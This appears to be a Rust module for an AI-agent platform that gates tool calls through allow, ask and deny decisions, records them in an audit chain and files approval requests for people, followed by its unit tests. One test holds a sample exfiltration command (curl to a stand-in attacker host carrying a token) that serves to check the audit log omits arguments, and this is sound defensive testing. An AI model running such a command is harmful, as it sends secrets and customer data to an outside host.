//! The gate every tool call passes before it runs: one function that asks the permission engine, writes the decision to
//! the audit chain, and turns an *ask* into a request in the approvals inbox.
//!
//! It works on a [`Book`], so the caller changes the task store with it as one locked step (`TaskStore::update`): the
//! decision, the approval request and the grant use are saved together, and the chain gets them in the same write
//! (`ozbox_core::audit`). Nothing here runs a tool, waits, or reads a clock; the caller does.
//!
//! What is recorded: the action word (`permission.allow|ask|deny`), who, the tool, its server, whether it reads or writes,
//! the mode and the reason. **Never the arguments or the output.** The exact action a person is asked to approve (a command
//! line, a path) lives on the approval request, secrets removed, and nowhere in the chain.
//!
//! One approval covers one call. A call that asks makes a request keyed by the session and the exact action; a repeat of
//! the same call while it is pending waits on the same request, an approved one is spent by the call that uses it, and a
//! denied or lapsed one is spent by telling the caller no, so the next repeat asks again.

use crate::approvals::scrub_secrets;
use crate::permissions::{self, Action, ActorKind, Ctx, Effect, Environment, Reason};
use crate::run::{ActionKind, ApprovalRequest, ApprovalState, Book};

/// Everything the gate needs to know about one tool call. Names and short descriptions only.
#[derive(Debug, Clone)]
pub struct ToolCall {
    /// What ties the call to a run or a person's session: the run id, or `person:<name>`.
    pub session_key: String,
    pub person: String,
    pub actor: ActorKind,
    pub box_name: Option<String>,
    pub run_id: Option<String>,
    pub orchestration: Option<String>,
    pub env: Environment,
    pub tool: String,
    /// The MCP server that offers the tool (`host`, `git`, `orchestration` ...).
    pub server: String,
    /// `Some(false)` reads, `Some(true)` writes, `None` is unknown (and counts as a write).
    pub writes: Option<bool>,
    /// A path (or a branch name for git) a rule on paths can match.
    pub path: Option<String>,
    /// The program and arguments, for a rule on commands. Never stored.
    pub command: Option<Vec<String>>,
    /// The approval policy singled this call out (a push to a protected branch, an ask-list command).
    pub sensitive: bool,
    /// The exact action as a person should read it, secrets removed. Shown on the approval request only.
    pub summary: String,
    /// A built-in tool that is governed by its own policy: the mode alone never asks about it. A rule, plan-only, the
    /// production gate and an explicit ask rule still apply.
    pub baseline_allow: bool,
    /// The tool's own judgement says a person must decide this call (ADR 0037: a browser step that submits, sends, pays,
    /// opens a new site, uploads or opens a program). An allow rule, a grant or the mode then asks instead of allowing, so
    /// the run that follows always carries a person's approval. A deny still wins.
    pub person_required: bool,
    /// The program a terminal enrolment's process runs, named by the door from `/proc` (never by the caller): a short
    /// `comm`/`exe` word. Shown on the card and in the audit so a person can tell two programs apart. None for a run.
    pub program: Option<String>,
    /// The pid of that program, as the door read it (the engine that started the bridge, not the bridge).
    pub program_pid: Option<u32>,
    /// The session code the door made for this terminal enrolment: a keyed hash that only the door can compute, so
    /// the person can match what their engine was told with the card. None for a run.
    pub session_code: Option<String>,
}

impl ToolCall {
    fn ctx(&self) -> Ctx {
        Ctx {
            person: self.person.clone(),
            actor: self.actor,
            box_name: self.box_name.clone(),
            project: None,
            run_id: self.run_id.clone(),
            orchestration: self.orchestration.clone(),
            env: self.env,
            path: self.path.clone(),
            command: self.command.clone(),
            tool: Some(self.tool.clone()),
            server: Some(self.server.clone()),
            writes: self.writes,
            sensitive: self.sensitive,
        }
    }

    /// Who the audit names: the session key, then the program the door read for it (a terminal enrolment), in brackets.
    pub fn actor_label(&self) -> String {
        match &self.program {
            // the program and the pid the card shows, so a person reading the audit and the card sees one process
            Some(p) => match self.program_pid {
                Some(pid) => format!("mcp:{}[{p}:{pid}]", self.session_key),
                None => format!("mcp:{}[{p}]", self.session_key),
            },
            None => format!("mcp:{}", self.session_key),
        }
    }

    /// Who the card says asked. A coding agent in the box's terminal is named as a CLAIM: the name is the word the program
    /// has for itself (its `comm`, which any program can set), so the card says "calls itself", never that it is that
    /// program, and gives the session code the person can match with what their own engine shows.
    fn asked_by(&self) -> String {
        if self.actor.is_terminal() {
            let code = self.session_code.as_deref().unwrap_or("unknown");
            let who = match (&self.program, self.program_pid) {
                (Some(p), Some(pid)) => {
                    format!("a program that calls itself {p} (pid {pid}, session {code})")
                }
                (Some(p), None) => format!("a program that calls itself {p} (session {code})"),
                _ => format!("a program that does not say what it is (session {code})"),
            };
            format!("{who}, in this box's terminal, for {}", self.person)
        } else {
            format!("agent for {}", self.person)
        }
    }

    /// The task id the approvals of this caller are filed under: one per enrolment key.
    pub fn approval_task(&self) -> String {
        format!("tool:{}", self.session_key)
    }

    /// The exact action text an approval for this call carries.
    pub fn approval_text(&self) -> String {
        scrub_secrets(&format!("{}.{}: {}", self.server, self.tool, self.summary))
            .chars()
            .take(300)
            .collect()
    }
}

/// What the door for coding agents writes as `decided_by` on a card it ended (not a person's answer; the colon keeps it from ever being a sign-in name): the one marker
/// [`Refusal::Withdrawn`] is told by, so no other writer's denial is ever described as a change of the door.
pub const DOOR_WITHDRAWN: &str = "system:door-withdrawn";

/// Why a call was refused.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Refusal {
    /// A rule, plan-only, or the production gate said no.
    Engine {
        reason: Reason,
        rule: Option<String>,
    },
    /// A person was asked and said no, or the request lapsed.
    NotApproved { lapsed: bool },
    /// The request was ended by the system, not decided by a person: the door for coding agents changed while the call waited
    /// (turned off, standing permission ended early, another person), so the question it asked no longer stands.
    Withdrawn,
    /// A coding agent in the box's terminal on a production box: no grant covers it unless the person turned on standing
    /// permission for coding agents.
    TerminalOnProduction,
}

impl Refusal {
    /// A sentence for the agent: what happened and what to do instead. No identifiers beyond the rule's.
    pub fn message(&self) -> String {
        match self {
            Refusal::Engine { reason, rule } => match rule {
                Some(r) => format!("{} (rule {r})", reason.sentence()),
                None => reason.sentence().to_string(),
            },
            Refusal::TerminalOnProduction => "This is on production, and a coding agent in this box's terminal is covered by no grant. A person can turn on standing permission for coding agents on the box page, under Coding agents on this box, Standing permissions, or do this from the dashboard.".into(),
            Refusal::NotApproved { lapsed: true } => {
                "Nobody answered in time, so this was not done. Ask again if it is still needed."
                    .into()
            }
            Refusal::NotApproved { lapsed: false } => {
                "A person said no, so this was not done. Do not try to get around it.".into()
            }
            Refusal::Withdrawn => "The person changed what coding agents on this box may do while this was waiting for an answer, so the request was withdrawn and nothing was done. Ask again if it is still needed.".into(),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Verdict {
    /// Go ahead. `approval` is the request that covered this call, if one did.
    Run {
        approval: Option<String>,
    },
    /// A person has been asked: wait for this request, then call the gate again.
    Wait {
        approval_id: String,
    },
    Refuse(Refusal),
}

/// Decide one tool call and record it. See the module docs.
pub fn gate(book: &mut Book, c: &ToolCall, now_ms: u64) -> Verdict {
    let ctx = c.ctx();
    let mut d = permissions::decide(&book.perms, &ctx, Action::ToolCall, now_ms);
    if c.person_required && d.effect != Effect::Deny {
        if d.effect == Effect::Allow {
            d.reason = Reason::PersonRequired;
            d.rule = None;
            d.grant = None;
        }
        d.effect = Effect::Ask;
    } else if c.baseline_allow && d.effect == Effect::Ask && d.reason == Reason::ModeDefault {
        d.effect = Effect::Allow;
    }
    let actor = c.actor_label();
    let record = |book: &mut Book, d: &permissions::Decision| {
        let ev = permissions::audit_event(d, &ctx, Action::ToolCall, &actor, now_ms);
        book.record(now_ms, &actor, &ev.action, c.run_id.as_deref(), &ev.detail);
        if let Some(g) = d.grant.as_deref().filter(|_| d.effect != Effect::Deny) {
            book.perms.use_grant(g);
            book.record(now_ms, &actor, "grant.used", c.run_id.as_deref(), g);
        }
    };
    match d.effect {
        Effect::Deny => {
            record(book, &d);
            if d.reason == Reason::ProductionNoGrant && c.actor == ActorKind::Terminal {
                return Verdict::Refuse(Refusal::TerminalOnProduction);
            }
            return Verdict::Refuse(Refusal::Engine {
                reason: d.reason,
                rule: d.rule,
            });
        }
        Effect::Allow => {
            record(book, &d);
            return Verdict::Run { approval: None };
        }
        Effect::Ask => {}
    }

    // It asks. A request already made for exactly this call settles it.
    let tid = c.approval_task();
    let text = c.approval_text();
    if let Some(i) = book
        .approvals
        .iter()
        .position(|a| a.task_id == tid && a.action == text && !a.used)
    {
        let (id, state, expires) = {
            let a = &book.approvals[i];
            (a.id.clone(), a.state, a.expires_ms)
        };
        let lapsed = state == ApprovalState::Pending && now_ms >= expires;
        match state {
            ApprovalState::Pending if !lapsed => return Verdict::Wait { approval_id: id },
            ApprovalState::Approved => {
                book.approvals[i].used = true;
                book.record(
                    now_ms,
                    &actor,
                    "permission.allow",
                    c.run_id.as_deref(),
                    &format!(
                        "tool.call tool={} server={} writes={} why=approved_request approval={id}",
                        c.tool,
                        c.server,
                        writes_word(c.writes)
                    ),
                );
                return Verdict::Run { approval: Some(id) };
            }
            _ => {
                let a = &mut book.approvals[i];
                a.used = true;
                if state == ApprovalState::Denied && a.decided_by.as_deref() == Some(DOOR_WITHDRAWN)
                {
                    // ended by the system when the door changed (it was never a person's no): say so
                    return Verdict::Refuse(Refusal::Withdrawn);
                }
                if lapsed {
                    a.state = ApprovalState::Expired;
                    a.decided_ms = Some(now_ms);
                    a.decided_by = Some("supervisor".into());
                }
                return Verdict::Refuse(Refusal::NotApproved {
                    lapsed: lapsed || state == ApprovalState::Expired,
                });
            }
        }
    }
    record(book, &d);
    book.next_seq += 1;
    let id = format!("a{}", book.next_seq);
    let expiry = book.policy.expiry_s * 1000;
    book.approvals.push(ApprovalRequest {
        id: id.clone(),
        task_id: tid,
        kind: ActionKind::ToolCall,
        action: text,
        box_name: c.box_name.clone().unwrap_or_default(),
        asked_by: c.asked_by(),
        production: c.env == Environment::Production,
        needs_step_up: c.env == Environment::Production,
        state: ApprovalState::Pending,
        created_ms: now_ms,
        expires_ms: now_ms + expiry,
        reminders: 0,
        decided_by: None,
        decided_ms: None,
        decided_with_step_up: false,
        // nothing of the supervisor's is waiting on this request: the tool call is
        delivered: true,
        used: false,
    });
    book.record(
        now_ms,
        &actor,
        "approval.requested",
        c.run_id.as_deref(),
        &id,
    );
    Verdict::Wait { approval_id: id }
}

/// Decide an action that is not a tool call (starting a scheduled run, typing into a terminal from a chat, deciding an
/// approval) and record it. `Err` carries a sentence for the person when it is refused. An *ask* is not a refusal here: the
/// person doing these things is the one the engine would ask.
pub fn permit(
    book: &mut Book,
    ctx: &Ctx,
    action: Action,
    actor: &str,
    subject: Option<&str>,
    now_ms: u64,
) -> Result<(), String> {
    let d = permissions::decide(&book.perms, ctx, action, now_ms);
    let ev = permissions::audit_event(&d, ctx, action, actor, now_ms);
    book.record(now_ms, actor, &ev.action, subject, &ev.detail);
    if let Some(g) = d.grant.as_deref().filter(|_| d.effect != Effect::Deny) {
        book.perms.use_grant(g);
        book.record(now_ms, actor, "grant.used", subject, g);
    }
    match d.effect {
        Effect::Deny => Err(match &d.rule {
            Some(r) => format!("{} (rule {r})", d.reason.sentence()),
            None => d.reason.sentence().to_string(),
        }),
        _ => Ok(()),
    }
}

/// Record that a call that was let through has finished: how it ended, in a word.
pub fn complete(book: &mut Book, c: &ToolCall, outcome: &str, now_ms: u64) {
    let actor = c.actor_label();
    book.record(
        now_ms,
        &actor,
        "tool.completed",
        c.run_id.as_deref(),
        &format!(
            "tool={} server={} writes={} outcome={}",
            c.tool,
            c.server,
            writes_word(c.writes),
            outcome
                .chars()
                .filter(|ch| ch.is_ascii_alphanumeric() || *ch == '_')
                .take(24)
                .collect::<String>()
        ),
    );
}

fn writes_word(w: Option<bool>) -> &'static str {
    match w {
        Some(true) => "yes",
        Some(false) => "no",
        None => "unknown",
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::field_reassign_with_default)]
mod tests {
    use super::*;
    use crate::permissions::{Effect, Mode, NewGrant, PermSettings, Rule, Scope, SecondFactor};

    fn call(tool: &str, writes: Option<bool>) -> ToolCall {
        ToolCall {
            session_key: "t1".into(),
            person: "ada".into(),
            actor: ActorKind::Agent,
            box_name: Some("alpha".into()),
            run_id: Some("t1".into()),
            orchestration: None,
            env: Environment::Sandbox,
            tool: tool.into(),
            server: "host".into(),
            writes,
            path: None,
            command: None,
            sensitive: false,
            summary: "do the thing".into(),
            baseline_allow: false,
            person_required: false,
            program: None,
            program_pid: None,
            session_code: None,
        }
    }

    fn deny_rule(tool: &str) -> Rule {
        Rule {
            id: String::new(),
            effect: Effect::Deny,
            action: "tool.call".into(),
            scope: Scope::Person,
            scope_id: None,
            path: None,
            command: None,
            env: None,
            tool: Some(tool.into()),
            server: None,
            note: String::new(),
        }
    }

    fn words(b: &Book) -> Vec<String> {
        b.audit.iter().map(|r| r.action.clone()).collect()
    }

    #[test]
    fn a_read_goes_ahead_and_is_recorded_with_the_tool_and_no_arguments() {
        let mut b = Book::default();
        let mut c = call("files_read", Some(false));
        c.summary = "read /work/secret-plan.txt".into();
        assert_eq!(gate(&mut b, &c, 1000), Verdict::Run { approval: None });
        let r = b.audit.last().unwrap();
        assert_eq!(r.action, "permission.allow");
        assert!(
            r.detail.contains("tool=files_read")
                && r.detail.contains("server=host")
                && r.detail.contains("writes=no")
        );
        assert!(!format!("{:?}", b.audit).contains("secret-plan"));
        assert!(b.approvals.is_empty());
    }

    #[test]
    fn an_unknown_tool_is_a_write_and_asks() {
        let mut b = Book::default();
        let v = gate(&mut b, &call("mystery", None), 1000);
        assert!(matches!(v, Verdict::Wait { .. }), "{v:?}");
        assert!(words(&b).contains(&"approval.requested".to_string()));
        let ask = b
            .audit
            .iter()
            .find(|r| r.action == "permission.ask")
            .unwrap();
        assert!(ask.detail.contains("writes=unknown"));
    }

    #[test]
    fn a_write_asks_once_and_a_repeat_waits_on_the_same_request() {
        let mut b = Book::default();
        let c = call("files_write", Some(true));
        let Verdict::Wait { approval_id } = gate(&mut b, &c, 1000) else {
            panic!()
        };
        assert_eq!(
            gate(&mut b, &c, 2000),
            Verdict::Wait {
                approval_id: approval_id.clone()
            }
        );
        assert_eq!(b.approvals.len(), 1);
        let a = &b.approvals[0];
        assert_eq!(a.kind, ActionKind::ToolCall);
        assert_eq!(a.action, "host.files_write: do the thing");
        assert!(a.delivered, "the supervisor has nothing to deliver for it");
    }

    #[test]
    fn an_approved_request_covers_exactly_one_call() {
        let mut b = Book::default();
        let c = call("files_write", Some(true));
        let Verdict::Wait { approval_id } = gate(&mut b, &c, 1000) else {
            panic!()
        };
        crate::supervisor::decide(&mut b, &approval_id, true, "ada", false, 1500).unwrap();
        assert_eq!(
            gate(&mut b, &c, 2000),
            Verdict::Run {
                approval: Some(approval_id.clone())
            }
        );
        // the next identical call asks again
        assert!(
            matches!(gate(&mut b, &c, 3000), Verdict::Wait { approval_id: n } if n != approval_id)
        );
    }

    #[test]
    fn a_denied_request_is_refused_once_and_the_next_call_asks_again() {
        let mut b = Book::default();
        let c = call("files_write", Some(true));
        let Verdict::Wait { approval_id } = gate(&mut b, &c, 1000) else {
            panic!()
        };
        crate::supervisor::decide(&mut b, &approval_id, false, "ada", false, 1500).unwrap();
        assert_eq!(
            gate(&mut b, &c, 2000),
            Verdict::Refuse(Refusal::NotApproved { lapsed: false })
        );
        assert!(matches!(gate(&mut b, &c, 3000), Verdict::Wait { .. }));
    }

    #[test]
    fn a_request_the_system_withdrew_is_not_called_a_persons_no() {
        let mut b = Book::default();
        let c = call("files_write", Some(true));
        let Verdict::Wait { approval_id } = gate(&mut b, &c, 1000) else {
            panic!()
        };
        let a = b
            .approvals
            .iter_mut()
            .find(|a| a.id == approval_id)
            .unwrap();
        a.state = ApprovalState::Denied;
        a.decided_by = Some(DOOR_WITHDRAWN.into());
        assert_eq!(gate(&mut b, &c, 2000), Verdict::Refuse(Refusal::Withdrawn));
        assert!(Refusal::Withdrawn.message().contains("withdrawn"));
        assert!(matches!(gate(&mut b, &c, 3000), Verdict::Wait { .. }));
    }

    #[test]
    fn a_request_nobody_answered_lapses_and_is_never_treated_as_a_yes() {
        let mut b = Book::default();
        let c = call("files_write", Some(true));
        gate(&mut b, &c, 1000);
        let late = 1000 + b.policy.expiry_s * 1000 + 1;
        assert_eq!(
            gate(&mut b, &c, late),
            Verdict::Refuse(Refusal::NotApproved { lapsed: true })
        );
        assert_eq!(b.approvals[0].state, ApprovalState::Expired);
    }

    #[test]
    fn a_deny_rule_refuses_with_no_request_and_names_the_rule() {
        let mut b = Book::default();
        b.perms
            .apply_settings(PermSettings {
                default_mode: Mode::Auto,
                modes: vec![],
                rules: vec![deny_rule("shell")],
                browser_hosts: vec![],
            })
            .unwrap();
        let v = gate(&mut b, &call("shell", Some(true)), 1000);
        assert_eq!(
            v,
            Verdict::Refuse(Refusal::Engine {
                reason: Reason::RuleDeny,
                rule: Some("r1".into())
            })
        );
        assert!(b.approvals.is_empty());
        assert!(words(&b).contains(&"permission.deny".to_string()));
        // another tool is unaffected, even in auto
        assert_eq!(
            gate(&mut b, &call("files_write", Some(true)), 1000),
            Verdict::Run { approval: None }
        );
    }

    #[test]
    fn plan_only_refuses_a_writing_tool_and_lets_a_reading_one_through() {
        let mut b = Book::default();
        b.perms.default_mode = Mode::PlanOnly;
        assert!(matches!(
            gate(&mut b, &call("shell", Some(true)), 1),
            Verdict::Refuse(Refusal::Engine {
                reason: Reason::PlanOnly,
                ..
            })
        ));
        assert!(matches!(
            gate(&mut b, &call("files_read", Some(false)), 1),
            Verdict::Run { .. }
        ));
    }

    #[test]
    fn production_without_a_grant_is_refused_and_asks_nobody() {
        let mut b = Book::default();
        let mut c = call("shell", Some(true));
        c.env = Environment::Production;
        let v = gate(&mut b, &c, 1000);
        assert_eq!(
            v,
            Verdict::Refuse(Refusal::Engine {
                reason: Reason::ProductionNoGrant,
                rule: None
            })
        );
        assert!(b.approvals.is_empty());
    }

    #[test]
    fn a_grant_lets_production_through_is_counted_and_recorded() {
        let mut b = Book::default();
        b.perms
            .create_grant(
                NewGrant {
                    granted_by: "ada".into(),
                    scope: Scope::Box,
                    scope_id: "alpha".into(),
                    actions: vec!["tool.call".into()],
                    reason: "deploy the fix".into(),
                    minutes: 30,
                    factor: SecondFactor::StepUp,
                    allow_unattended: false,
                    max_uses: Some(1),
                },
                1000,
            )
            .unwrap();
        b.perms.default_mode = Mode::Auto;
        let mut c = call("deploy", Some(true));
        c.env = Environment::Production;
        // auto never asks, so the grant is enough
        assert_eq!(gate(&mut b, &c, 2000), Verdict::Run { approval: None });
        assert_eq!(b.perms.grants[0].uses, 1);
        assert!(words(&b).contains(&"grant.used".to_string()));
        // a use-limited grant is spent
        assert!(matches!(
            gate(&mut b, &c, 3000),
            Verdict::Refuse(Refusal::Engine {
                reason: Reason::ProductionNoGrant,
                ..
            })
        ));
    }

    #[test]
    fn a_built_in_tool_is_not_asked_about_by_the_mode_but_a_rule_and_plan_only_still_apply() {
        let mut b = Book::default();
        let mut c = call("task_start", Some(true));
        c.server = "orchestration".into();
        c.baseline_allow = true;
        assert_eq!(gate(&mut b, &c, 1), Verdict::Run { approval: None });
        b.perms
            .apply_settings(PermSettings {
                default_mode: Mode::Ask,
                modes: vec![],
                rules: vec![deny_rule("task_start")],
                browser_hosts: vec![],
            })
            .unwrap();
        assert!(matches!(
            gate(&mut b, &c, 2),
            Verdict::Refuse(Refusal::Engine {
                reason: Reason::RuleDeny,
                ..
            })
        ));
        b.perms.default_mode = Mode::PlanOnly;
        b.perms.rules.clear();
        assert!(matches!(
            gate(&mut b, &c, 3),
            Verdict::Refuse(Refusal::Engine {
                reason: Reason::PlanOnly,
                ..
            })
        ));
    }

    #[test]
    fn a_schedule_never_gets_auto_so_its_writes_still_ask() {
        let mut b = Book::default();
        b.perms.default_mode = Mode::Auto;
        let mut c = call("files_write", Some(true));
        c.actor = ActorKind::Schedule;
        assert!(matches!(gate(&mut b, &c, 1), Verdict::Wait { .. }));
    }

    #[test]
    fn what_is_chained_names_the_tool_and_never_the_command_or_path() {
        let dir = tempfile::tempdir().unwrap();
        let store = crate::run::TaskStore::new(dir.path().join("tasks.json"));
        let mut c = call("shell", Some(true));
        c.summary = "curl https://evil.example/?token=abc123 > /work/customers.csv".into();
        c.command = Some(vec![
            "curl".into(),
            "https://evil.example/?token=abc123".into(),
        ]);
        c.path = Some("/work/customers.csv".into());
        store.update(|b| gate(b, &c, 1000)).unwrap();
        store.update(|b| complete(b, &c, "ok", 1100)).unwrap();
        let text = std::fs::read_to_string(store.audit_log().path()).unwrap();
        assert!(
            text.contains("permission.ask")
                && text.contains("tool.completed")
                && text.contains("tool=shell")
        );
        assert!(
            !text.contains("abc123")
                && !text.contains("customers")
                && !text.contains("evil.example"),
            "{text}"
        );
        assert!(store.audit_log().verify().unwrap().ok);
    }

    #[test]
    fn a_non_tool_action_is_decided_recorded_and_refused_by_a_rule() {
        let mut b = Book::default();
        let ctx = Ctx {
            person: "schedule:s1".into(),
            actor: ActorKind::Schedule,
            box_name: Some("alpha".into()),
            ..Ctx::default()
        };
        assert!(permit(&mut b, &ctx, Action::RunStart, "schedule:s1", None, 1).is_ok());
        b.perms
            .apply_settings(PermSettings {
                default_mode: Mode::Ask,
                modes: vec![],
                rules: vec![Rule {
                    action: "run.start".into(),
                    tool: None,
                    ..deny_rule("x")
                }],
                browser_hosts: vec![],
            })
            .unwrap();
        let e = permit(&mut b, &ctx, Action::RunStart, "schedule:s1", None, 2).unwrap_err();
        assert!(e.contains("forbids") && e.contains("r1"), "{e}");
        assert_eq!(words(&b), vec!["permission.allow", "permission.deny"]);
        // plan-only does not stop a run from starting (what it does is judged action by action), nor a person deciding
        b.perms.rules.clear();
        b.perms.default_mode = Mode::PlanOnly;
        assert!(permit(&mut b, &ctx, Action::RunStart, "schedule:s1", None, 3).is_ok());
        assert!(permit(&mut b, &ctx, Action::ApprovalDecide, "ada", None, 4).is_ok());
        assert!(permit(&mut b, &ctx, Action::CommandRun, "ada", None, 5).is_err());
    }

    #[test]
    fn completion_is_a_word_not_a_message() {
        let mut b = Book::default();
        complete(
            &mut b,
            &call("shell", Some(true)),
            "timeout: the command ran 99 s with /etc/passwd",
            5,
        );
        let r = b.audit.last().unwrap();
        assert_eq!(r.action, "tool.completed");
        assert!(
            !r.detail.contains("passwd") && !r.detail.contains('/'),
            "{}",
            r.detail
        );
        assert!(r.detail.contains("outcome=timeout"));
    }

    #[test]
    fn a_call_that_needs_a_person_asks_even_when_a_rule_or_the_mode_allows() {
        let mut b = Book::default();
        b.perms.default_mode = Mode::Auto;
        let mut c = call("browser_click", Some(true));
        c.server = "browser".into();
        c.person_required = true;
        let v = gate(&mut b, &c, 1);
        let Verdict::Wait { approval_id } = v else {
            panic!("expected a request for a person, got {v:?}");
        };
        // the engine allowing it did not settle it: only the person's decision does, and it carries the request's id
        crate::supervisor::decide(&mut b, &approval_id, true, "ada", false, 2).unwrap();
        assert_eq!(
            gate(&mut b, &c, 3),
            Verdict::Run {
                approval: Some(approval_id)
            }
        );
        // a deny rule still wins
        let mut d = Book::default();
        d.perms.rules.push(deny_rule("browser_click"));
        assert!(matches!(gate(&mut d, &c, 1), Verdict::Refuse(_)));
    }

    /// ADR 0043: a terminal agent asks even under `auto`, the card says what it is, and an approval one
    /// enrolment got is not spent by another enrolment making the same call.
    #[test]
    fn a_terminal_agent_asks_under_auto_is_named_on_the_card_and_approvals_do_not_cross_enrolments()
    {
        let mut b = Book::default();
        b.perms.default_mode = Mode::Auto;
        let mut a = call("shell", Some(true));
        a.actor = ActorKind::Terminal;
        a.session_key = "terminal-100-aa-1".into();
        a.program = Some("claude".into());
        a.program_pid = Some(7);
        a.run_id = None;
        let Verdict::Wait { approval_id } = gate(&mut b, &a, 1) else {
            panic!("a terminal agent must ask under auto");
        };
        let asked = &b.approvals[0].asked_by;
        assert!(
            asked.contains("calls itself claude")
                && asked.contains("this box's terminal")
                && asked.contains("ada"),
            "{asked}"
        );
        assert!(!asked.starts_with("agent for"), "{asked}");
        crate::supervisor::decide(&mut b, &approval_id, true, "ada", false, 2).unwrap();
        // another enrolment (another program, same box user) makes the same call: it asks afresh, it does not spend this approval
        let mut other = a.clone();
        other.session_key = "terminal-200-bb-2".into();
        assert!(matches!(gate(&mut b, &other, 3), Verdict::Wait { .. }));
        assert_eq!(b.approvals.iter().filter(|x| x.used).count(), 0);
        assert_eq!(
            gate(&mut b, &a, 4),
            Verdict::Run {
                approval: Some(approval_id)
            }
        );
        // the audit tells the two apart
        assert!(b
            .audit
            .iter()
            .any(|r| r.actor == "mcp:terminal-100-aa-1[claude:7]"));
        assert!(b
            .audit
            .iter()
            .any(|r| r.actor == "mcp:terminal-200-bb-2[claude:7]"));
        // a run's request keeps the old words
        let mut r = Book::default();
        let Verdict::Wait { .. } = gate(&mut r, &call("shell", Some(true)), 1) else {
            panic!()
        };
        assert_eq!(r.approvals[0].asked_by, "agent for ada");
    }

    #[test]
    fn a_terminal_card_makes_a_claim_and_gives_a_code_and_the_audit_names_the_program() {
        let mut c = call("shell", Some(true));
        c.actor = ActorKind::Terminal;
        c.session_key = "terminal-4242-9912-77".into();
        c.program = Some("claude".into());
        c.program_pid = Some(4200);
        c.session_code = Some("K7Q2XA".into());
        let code = "K7Q2XA";
        let card = c.asked_by();
        assert_eq!(
            card,
            format!("a program that calls itself claude (pid 4200, session {code}), in this box's terminal, for ada")
        );
        // never the bridge's name, never a plain statement of who it is
        assert!(
            !card.contains("ozbox") && !card.contains("coding agent"),
            "{card}"
        );
        // the audit shows the same program and pid as the card
        assert_eq!(c.actor_label(), "mcp:terminal-4242-9912-77[claude:4200]");
        // the code is the door's to make: the card only repeats what it was given
        c.session_code = None;
        assert!(c.asked_by().contains("session unknown"));
        // a program the door could not name is not given a name
        c.program = None;
        assert!(c
            .asked_by()
            .starts_with("a program that does not say what it is"));
    }

    #[test]
    fn a_terminal_on_production_is_told_about_standing_permission_not_to_grant_access() {
        let mut book = Book::default();
        let mut c = call("shell", Some(true));
        c.env = Environment::Production;
        c.actor = ActorKind::Terminal;
        c.session_key = "terminal-1-2".into();
        let v = gate(&mut book, &c, 1_000);
        assert_eq!(v, Verdict::Refuse(Refusal::TerminalOnProduction));
        let Verdict::Refuse(r) = v else {
            unreachable!()
        };
        assert!(
            r.message().contains("standing permission") && !r.message().contains("Grant access"),
            "{}",
            r.message()
        );
        assert!(
            r.message()
                .contains("under Coding agents on this box, Standing permissions")
                && !r.message().contains("Settings"),
            "{}",
            r.message()
        );
        // a run still gets the plain production sentence
        let mut run = call("shell", Some(true));
        run.env = Environment::Production;
        let Verdict::Refuse(r) = gate(&mut book, &run, 1_000) else {
            panic!()
        };
        assert!(r.message().contains("Grant access"));
    }
}
